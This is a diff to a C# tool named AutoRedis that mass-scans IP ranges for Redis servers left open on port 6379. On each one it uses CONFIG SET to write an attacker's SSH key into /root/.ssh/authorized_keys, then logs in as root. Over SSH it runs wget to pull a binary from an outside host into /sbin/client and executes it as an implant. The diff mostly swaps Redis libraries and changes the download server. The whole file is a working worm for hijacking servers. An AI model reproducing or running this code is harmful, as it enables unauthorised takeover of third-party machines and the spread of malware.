@@ -10,6 +10,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using Renci.SshNet;
+using ServiceStack.Redis;
 using StackExchange.Redis;
 
 namespace AutoRedis
@@ -20,28 +21,29 @@ namespace AutoRedis
         public static int port = 6379;
         public static List<string> IpList = new List<string>();
         public static int tnum = 80;
+
         static void Main(string[] args)
         {
-                       var ipsecs = File.ReadAllLines(Local + "ipsec.txt");
-                       var total = ipsecs.Length;
-                       double finish = 0;
-                       foreach (var ipsec in ipsecs)
-                       {
-                           Console.WriteLine("start");
-                           IpList.Clear();
-                           var ipqueue = new Queue<string>();
-                           var ips = ipsec.Split(' ');
-                           var ip1strs = ips[0].Split('.');
-                           var ip2strs = ips[1].Split('.');
-                           int[] ip1 = new int[4];
-                           int[] ip2 = new int[4];
-                           for (int i = 0; i < 4; i++)
-                           {
-                               ip1[i] = Convert.ToInt32(ip1strs[i]);
-                               ip2[i] = Convert.ToInt32(ip2strs[i]);
-                           }
-                           while (ip1[0]*1000000000 + ip1[1]*1000000 + ip1[2]*1000 + ip1[3] <=
-                                  ip2[0]*1000000000 + ip2[1]*1000000 + ip2[2]*1000 + ip2[3])
+                        var ipsecs = File.ReadAllLines(Local + "ipsec.txt");
+                        var total = ipsecs.Length;
+                        double finish = 0;
+                        foreach (var ipsec in ipsecs)
+                        {
+                            Console.WriteLine("start:" + ipsec);
+                            IpList.Clear();
+                            var ipqueue = new Queue<string>();
+                            var ips = ipsec.Split(new char[] {' '}, StringSplitOptions.RemoveEmptyEntries);
+                            var ip1strs = ips[0].Split('.');
+                            var ip2strs = ips[1].Split('.');
+                            int[] ip1 = new int[4];
+                            int[] ip2 = new int[4];
+                            for (int i = 0; i < 4; i++)
+                            {
+                                ip1[i] = Convert.ToInt32(ip1strs[i]);
+                                ip2[i] = Convert.ToInt32(ip2strs[i]);
+                            }
+                            while (ip1[0]*1000000000 + ip1[1]*1000000 + ip1[2]*1000 + ip1[3] <=
+                                   ip2[0]*1000000000 + ip2[1]*1000000 + ip2[2]*1000 + ip2[3])
                             {
                                 var ip = ip1[0] + "." + ip1[1] + "." + ip1[2] + "." + ip1[3];
                                 ipqueue.Enqueue(ip);
@@ -67,13 +69,12 @@ namespace AutoRedis
                                 }
                             }
                             List<Thread> list = new List<Thread>();
-                            for (int i = 0; i < 400; i++)
+                            for (int i = 0; i < 500; i++)
                             {
                                 Thread thread = new Thread(() =>
                                 {
                                     while (ipqueue.Count > 0)
                                     {
-                                        
                                         Monitor.Enter(ipqueue);
                                         if (ipqueue.Count > 0)
                                         {
@@ -95,6 +96,7 @@ namespace AutoRedis
                             {
                                 thread.Join();
                             }
+            
                             GrepIps(tnum);
                             Console.WriteLine("GrepIps Finished");
                             Attack(tnum);
@@ -108,12 +110,10 @@ namespace AutoRedis
                             Thread.Sleep(5000);
                         }
 
-
             Console.WriteLine("Finished");
             Console.ReadKey();
             Console.ReadKey();
         }
-
         public static void GrepIps(int tnum = 15)
         {
             List<string> result = new List<string>();
@@ -125,43 +125,38 @@ namespace AutoRedis
                 {
                     while (queue.Count > 0)
                     {
-                   
                         Monitor.Enter(queue);
                         if (queue.Count > 0)
                         {
-                            var ip = queue.Dequeue() + ":6379";
+                            var ip = queue.Dequeue();
                             Monitor.Exit(queue);
+
+
+                            RedisClient client = new RedisClient(ip, 6379);
+                            client.ConnectTimeout = 500;
                             try
                             {
-                                IConnectionMultiplexer redis =
-                                    ConnectionMultiplexer.Connect(ip + ",AllowAdmin = true");
-                                var serv = redis.GetServer(ip);
-                                var set = new RedisValue();
-                                var val = new RedisValue();
-                                set = "dir";
-                                val = "/root/.ssh/";
-                                serv.ConfigSet(set, val);
-                                if (redis.IsConnected)
-                                {
-                                    //Console.WriteLine(ip);
-                                    result.Add(ip);
-                                }
+                                client.RetryTimeout = 500;
+                                client.SendTimeout = 500;
+                                client.ReceiveTimeout = 500;
+                                client.SetConfig("dir", "/root/.ssh/");
+                                client.Save();
+                                result.Add(ip);
+                                Console.WriteLine("ip:"+ip);
                             }
                             catch (Exception e)
                             {
-                                if (e.Message.Contains("ERR"))
-                                {
-                                    result.Remove(ip);
-                                }
+                               // Console.WriteLine("failed:" + ip + e.Message);
+                            }
+                            finally
+                            {
+                               client.Dispose();
                             }
                         }
                         else
                         {
                             Monitor.Exit(queue);
                         }
-                        
-                       
-                        
                     }
                 });
                 list.Add(task);
@@ -175,6 +170,7 @@ namespace AutoRedis
             }
             File.WriteAllText(Local + "result.txt", sb.ToString());
         }
+
 
         public static void Attack(int tnum = 15)
         {
@@ -197,24 +193,17 @@ namespace AutoRedis
                             Monitor.Exit(queue);
                             try
                             {
-                                IConnectionMultiplexer redis =
-                                    ConnectionMultiplexer.Connect(ip + ",AllowAdmin = true");
-                                var s = redis.GetServer(ip);
+                                RedisClient client = new RedisClient(ip, 6379);
+                                client.ConnectTimeout = 500;
+                                client.RetryTimeout = 500;
+                                client.SendTimeout = 500;
+                                client.ReceiveTimeout = 500;
                                 for (int j = 0; j < 2; j++)
                                 {
-                                    s.FlushAllDatabases();
-                                    var db = redis.GetDatabase(0);
-                                    var key = new RedisKey();
-                                    var value = new RedisValue();
-                                    key = "crakit";
-                                    value = text;
-                                    db.StringSet(key, value);
-                                    var set = new RedisValue();
-                                    var val = new RedisValue();
-                                    set = "dir";
-                                    val = "/root/.ssh/";
-                                    s.ConfigSet(set, val);
-                                    set = "dbfilename";
+                                    client.Db = 0;
+                                    client.Set("crakit", Encoding.ASCII.GetBytes(text));
+                                    client.SetConfig("dir", "/root/.ssh/");
+                                    string val=null;
                                     if (j == 0)
                                     {
                                         val = "authorized_keys";
@@ -223,9 +212,9 @@ namespace AutoRedis
                                     {
                                         val = "KHK75NEOiq";
                                     }
-                                    s.ConfigSet(set, val);
-                                    s.Save(SaveType.BackgroundSave);
-                                    //Console.WriteLine(ip + " finished");
+                                    client.SetConfig("dbfilename", val);
+                                    client.Save();
+                                    Console.WriteLine(ip + " finished");
                                 }
                             }
                             catch (Exception e)
@@ -261,9 +250,9 @@ namespace AutoRedis
                         Monitor.Enter(queue);
                         if (queue.Count > 0)
                         {
-                            var ip = queue.Dequeue().Split(':')[0];
+                            var ip = queue.Dequeue();
                             Monitor.Exit(queue);
-                          
+
                             try
                             {
                                 var client = new SshClient(ip, "root", new PrivateKeyFile(Local + "key"));
@@ -275,7 +264,7 @@ namespace AutoRedis
                             catch (Exception e)
                             {
                                 result.Remove(ip);
-                                //Console.WriteLine(e.Message);
+                                Console.WriteLine(e.Message);
                             }
                         }
                         else
@@ -310,29 +299,43 @@ namespace AutoRedis
                 {
                     while (queue.Count > 0)
                     {
-                        Monitor.Enter(queue);
+                       
                         if (queue.Count > 0)
                         {
-                            var ip = queue.Dequeue().Split(':')[0];
+                            var ip = queue.Dequeue();
+                            Console.WriteLine(queue.Count);
                             Monitor.Exit(queue);
+                            if(string.IsNullOrEmpty(ip))
+                                continue;
                             try
                             {
                                 var client = new SshClient(ip, "root", new PrivateKeyFile(Local + "key"));
+                                
                                 client.Connect();
-                                client.RunCommand("wget https://chat.52elife.cn/client -O /sbin/client");
-                                Console.WriteLine(ip + " start download");
-                                Thread.Sleep(5000);
-                                client.RunCommand("chmod +x /sbin/client");
-                                Console.WriteLine(ip + " download ok");
-                                Thread.Sleep(1000);
-                                var ssh = client.CreateCommand("/sbin/client");
-                                ssh.BeginExecute();
-                                result.Add(ip);
-                                Console.WriteLine(ip + " implant finished");
+                                if (client.IsConnected)
+                                {
+//                                    var ssh1 = client.CreateCommand("kill `ps -ef|grep client|grep -v grep|awk '{print $2}'`");
+//                                    ssh1.BeginExecute();
+//                                    var ssh2 = client.CreateCommand("rm -f /sbin/client");
+//                                    ssh2.BeginExecute();
+
+                                    client.RunCommand(
+                                        "wget https://123.207.157.21/client -O /sbin/client --no-check-certificate");
+                                    Console.WriteLine(ip + " start download");
+                                    Thread.Sleep(5000);
+                                    client.RunCommand("chmod +x /sbin/client");
+                                    Console.WriteLine(ip + " download ok");
+                                    Thread.Sleep(1000);
+                                    var ssh = client.CreateCommand("/sbin/client");
+                                    ssh.BeginExecute();
+                                    result.Add(ip);
+                                    Console.WriteLine(ip + " implant finished");
+                                }
+                               
                             }
                             catch (Exception e)
                             {
-                                //Console.WriteLine(e.Message);
+                                Console.WriteLine(e.Message);
                             }
                         }
                         else
@@ -345,6 +348,7 @@ namespace AutoRedis
                 task.Start();
             }
             Task.WaitAll(list.ToArray());
+            Console.WriteLine("implant finished");
             StringBuilder sb = new StringBuilder();
             foreach (var str in result)
             {
@@ -368,20 +372,21 @@ namespace AutoRedis
 
         public void Scan()
         {
-            TimeoutObject.Reset();
-            Socket socket=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP);
+            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
             try
             {
-                socket.BeginConnect(m_host, m_port, o =>
-                {
-                    TimeoutObject.Set();
-                }, null);
+                socket.BeginConnect(m_host, m_port, o => { TimeoutObject.Set(); }, null);
                 TimeoutObject.WaitOne(200, false);
                 if (socket.Connected)
                 {
                     Program.IpList.Add(m_host);
-                    //Console.WriteLine(m_host + " 已连接");
+                    Console.WriteLine(m_host + " 已连接");
                 }
+                else
+                {
+                    // Console.WriteLine(m_host + " 连接失败");
+                }
+
                 socket.Dispose();
             }
             catch (Exception)
